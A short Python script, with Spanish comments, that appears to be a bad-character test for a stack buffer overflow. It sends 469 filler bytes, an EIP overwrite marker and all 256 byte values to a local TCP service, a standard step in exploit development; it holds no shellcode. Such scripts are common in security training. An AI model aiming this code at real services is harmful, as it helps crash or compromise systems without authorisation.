import socket

def bad_chars():
    all_chars = bytes(range(256))  # Genera todos los bytes de 0x00 a 0xFF
    offset = 469
    buffer = b"A" * offset
    eip = b"B" * 4
    payload = buffer + eip + all_chars

    # Imprimir los bad characters en formato hexadecimal
    print("Enviando los siguientes bad characters:")
    print(" ".join(f"\\x{b:02x}" for b in all_chars))

    # Envío del payload al servicio remoto
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("127.0.0.1", 21449))
        s.send(payload)
        s.close()
        print("\nPayload enviado con éxito.")
    except Exception as e:
        print(f"Error al enviar el payload: {e}")

bad_chars()

